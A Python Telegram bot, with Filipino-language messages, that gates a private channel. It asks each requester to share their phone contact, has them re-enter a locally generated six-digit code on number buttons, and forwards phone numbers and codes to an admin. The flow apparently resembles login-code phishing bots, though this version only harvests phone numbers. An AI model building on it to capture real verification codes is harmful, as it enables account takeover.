import logging
import random
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest
import sqlite3
from datetime import datetime, timedelta

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration - Get from Railway environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '5521402866'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '@your_private_channel')

class VerificationBot:
    def __init__(self):
        self.init_database()
        self.verification_sessions = {}  # Store active verification sessions
        
    def init_database(self):
        """Initialize SQLite database"""
        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pending_verifications (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verification_code TEXT,
                timestamp DATETIME,
                status TEXT DEFAULT 'pending'
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS verified_users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                phone_number TEXT,
                verified_date DATETIME
            )
        ''')
        
        self.conn.commit()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start command handler"""
        welcome_text = """
🤖 **Channel Verification Bot**

Ako ay tutulong sa iyo na ma-verify para makapasok sa private channel/group.

**Paano gumagana:**
1. Mag-request ka sa channel na gusto mong pasukan
2. Makakakuha ka ng private message mula sa akin
3. I-share mo ang contact number mo
4. Magpapadala ako ng verification code
5. I-input mo ang code gamit ang number buttons
6. Pag na-verify ka na, pwede ka na pumasok!

Simulan natin! 🚀
        """
        await update.message.reply_text(welcome_text, parse_mode='Markdown')

    async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle new join requests to the channel"""
        try:
            user = update.chat_join_request.from_user
            chat = update.chat_join_request.chat
            
            # Log the join request
            logger.info(f"New join request from {user.first_name} (@{user.username}) to {chat.title}")
            
            # Notify admin about the join request
            admin_message = f"""
🔔 **New Join Request**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📢 **Channel:** {chat.title}
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Starting verification process...
            """
            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
            
            # Send verification message to user
            verification_message = f"""
🔐 **Verification Required**

Kumusta {user.first_name}! 

Nakakita ko na nag-request ka sa **{chat.title}**. Para ma-approve ka, kailangan muna kitang i-verify na tunay kang tao at hindi bot.

**Step 1:** I-share mo ang contact number mo na ginagamit mo sa Telegram account mo.

👇 Pindutin ang button sa baba para mag-share ng contact info.
            """
            
            # Create contact sharing button
            contact_keyboard = ReplyKeyboardMarkup([
                [KeyboardButton("📱 Share Contact", request_contact=True)]
            ], resize_keyboard=True, one_time_keyboard=True)
            
            await context.bot.send_message(
                user.id, 
                verification_message, 
                parse_mode='Markdown',
                reply_markup=contact_keyboard
            )
            
            # Store pending verification
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO pending_verifications 
                (user_id, username, first_name, timestamp, status)
                VALUES (?, ?, ?, ?, ?)
            ''', (user.id, user.username, user.first_name, datetime.now(), 'awaiting_contact'))
            self.conn.commit()
            
        except Exception as e:
            logger.error(f"Error handling join request: {e}")
            await context.bot.send_message(ADMIN_ID, f"❌ Error handling join request: {e}")

    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle contact sharing"""
        try:
            user = update.message.from_user
            contact = update.message.contact
            
            # Verify it's the user's own contact
            if contact.user_id != user.id:
                await update.message.reply_text(
                    "❌ Kailangan mo i-share ang sarili mong contact info, hindi ng iba."
                )
                return
            
            # Generate verification code
            verification_code = str(random.randint(100000, 999999))
            
            # Update database with phone number and code
            cursor = self.conn.cursor()
            cursor.execute('''
                UPDATE pending_verifications 
                SET phone_number = ?, verification_code = ?, status = 'code_sent'
                WHERE user_id = ?
            ''', (contact.phone_number, verification_code, user.id))
            self.conn.commit()
            
            # Send verification code via Telegram (simulated)
            code_message = f"""
✅ **Contact Received!**

📱 **Phone:** {contact.phone_number}

🔢 **Verification Code:** `{verification_code}`

**Note:** Sa real implementation, ang code ay mapa-send sa phone number mo. Para sa demo, nandito na ang code.

Pindutin ang mga number sa baba para i-enter ang verification code:
            """
            
            # Create numeric keyboard
            keyboard = []
            numbers = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
            
            # Create 3x3 + 1 layout
            for i in range(0, 9, 3):
                row = [InlineKeyboardButton(num, callback_data=f"num_{num}") for num in numbers[i:i+3]]
                keyboard.append(row)
            keyboard.append([InlineKeyboardButton('0', callback_data='num_0')])
            
            # Add control buttons
            keyboard.append([
                InlineKeyboardButton('🔙 Backspace', callback_data='backspace'),
                InlineKeyboardButton('✅ Submit', callback_data='submit_code')
            ])
            keyboard.append([InlineKeyboardButton('🔢 Show Code Again', callback_data='show_code')])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                code_message,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            
            # Initialize verification session
            self.verification_sessions[user.id] = {
                'entered_code': '',
                'correct_code': verification_code,
                'phone_number': contact.phone_number
            }
            
            # Notify admin
            admin_notification = f"""
📱 **Contact Shared**

👤 **User:** {user.first_name} (@{user.username})
📞 **Phone:** {contact.phone_number}
🔢 **Code Sent:** `{verification_code}`
⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            """
            await context.bot.send_message(ADMIN_ID, admin_notification, parse_mode='Markdown')
            
        except Exception as e:
            logger.error(f"Error handling contact: {e}")
            await update.message.reply_text("❌ May error sa pag-process ng contact. Try again.")

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline keyboard callbacks"""
        try:
            query = update.callback_query
            user_id = query.from_user.id
            data = query.data
            
            await query.answer()
            
            if user_id not in self.verification_sessions:
                await query.edit_message_text("❌ Session expired. Please start verification again.")
                return
            
            session = self.verification_sessions[user_id]
            
            if data.startswith('num_'):
                # Add number to entered code
                number = data.split('_')[1]
                if len(session['entered_code']) < 6:
                    session['entered_code'] += number
                    
                # Update display
                display_code = '●' * len(session['entered_code']) + '○' * (6 - len(session['entered_code']))
                await query.edit_message_text(
                    f"🔢 **Enter Verification Code**\n\nCode: `{display_code}`\n\nEntered: {len(session['entered_code'])}/6 digits",
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                
            elif data == 'backspace':
                # Remove last entered digit
                if session['entered_code']:
                    session['entered_code'] = session['entered_code'][:-1]
                    
                display_code = '●' * len(session['entered_code']) + '○' * (6 - len(session['entered_code']))
                await query.edit_message_text(
                    f"🔢 **Enter Verification Code**\n\nCode: `{display_code}`\n\nEntered: {len(session['entered_code'])}/6 digits",
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                
            elif data == 'show_code':
                # Show the verification code again
                await query.edit_message_text(
                    f"🔢 **Your Verification Code:** `{session['correct_code']}`\n\nEnter this code using the number buttons below:",
                    parse_mode='Markdown',
                    reply_markup=query.message.reply_markup
                )
                
            elif data == 'submit_code':
                # Verify the entered code
                if len(session['entered_code']) != 6:
                    await query.edit_message_text(
                        "❌ **Incomplete Code**\n\nPlease enter all 6 digits before submitting.",
                        parse_mode='Markdown',
                        reply_markup=query.message.reply_markup
                    )
                    return
                
                if session['entered_code'] == session['correct_code']:
                    # Code is correct - approve user
                    await self.approve_user(query, context)
                else:
                    # Code is incorrect
                    session['entered_code'] = ''  # Reset entered code
                    await query.edit_message_text(
                        "❌ **Incorrect Code**\n\nThe code you entered is incorrect. Please try again.\n\nHint: Use the 'Show Code Again' button if needed.",
                        parse_mode='Markdown',
                        reply_markup=query.message.reply_markup
                    )
                    
        except Exception as e:
            logger.error(f"Error handling callback: {e}")
            await query.edit_message_text("❌ May error. Please try again.")

    async def approve_user(self, query, context):
        """Approve user and add to verified users"""
        try:
            user = query.from_user
            session = self.verification_sessions[user.id]
            
            # Add to verified users
            cursor = self.conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO verified_users 
                (user_id, username, first_name, phone_number, verified_date)
                VALUES (?, ?, ?, ?, ?)
            ''', (user.id, user.username, user.first_name, session['phone_number'], datetime.now()))
            
            # Update pending verification status
            cursor.execute('''
                UPDATE pending_verifications 
                SET status = 'verified'
                WHERE user_id = ?
            ''', (user.id,))
            
            self.conn.commit()
            
            # Approve join request
            try:
                await context.bot.approve_chat_join_request(CHANNEL_ID, user.id)
                status_text = "✅ **Verification Successful!**\n\nCongratulations! Na-verify ka na at na-approve na ang request mo sa channel. Welcome! 🎉"
            except BadRequest as e:
                logger.error(f"Error approving join request: {e}")
                status_text = "✅ **Verification Successful!**\n\nNa-verify ka na! Please contact the admin to manually approve your request."
            
            await query.edit_message_text(status_text, parse_mode='Markdown')
            
            # Notify admin
            admin_message = f"""
✅ **User Verified Successfully**

👤 **User:** {user.first_name} (@{user.username})
🆔 **User ID:** `{user.id}`
📱 **Phone:** {session['phone_number']}
⏰ **Verified:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

User has been approved for channel access.
            """
            await context.bot.send_message(ADMIN_ID, admin_message, parse_mode='Markdown')
            
            # Clean up session
            del self.verification_sessions[user.id]
            
        except Exception as e:
            logger.error(f"Error approving user: {e}")
            await query.edit_message_text("❌ May error sa approval process. Contact admin.")

    async def admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show admin statistics"""
        if update.message.from_user.id != ADMIN_ID:
            return
            
        cursor = self.conn.cursor()
        
        # Get stats
        cursor.execute('SELECT COUNT(*) FROM verified_users')
        verified_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "pending"')
        pending_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM pending_verifications WHERE status = "verified"')
        total_verified = cursor.fetchone()[0]
        
        stats_message = f"""
📊 **Bot Statistics**

✅ **Verified Users:** {verified_count}
⏳ **Pending Verifications:** {pending_count}
📈 **Total Processed:** {total_verified}

**Recent Verifications:**
        """
        
        # Get recent verifications
        cursor.execute('''
            SELECT first_name, username, verified_date 
            FROM verified_users 
            ORDER BY verified_date DESC 
            LIMIT 5
        ''')
        
        recent = cursor.fetchall()
        for user in recent:
            stats_message += f"\n• {user[0]} (@{user[1]}) - {user[2]}"
            
        await update.message.reply_text(stats_message, parse_mode='Markdown')

def main():
    """Main function to run the bot"""
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN environment variable not set!")
        return
        
    # Initialize bot
    bot = VerificationBot()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("stats", bot.admin_stats))
    application.add_handler(ChatJoinRequestHandler(bot.handle_join_request))
    application.add_handler(MessageHandler(filters.CONTACT, bot.handle_contact))
    application.add_handler(CallbackQueryHandler(bot.handle_callback))
    
    # Start the bot
    logger.info("Starting bot...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
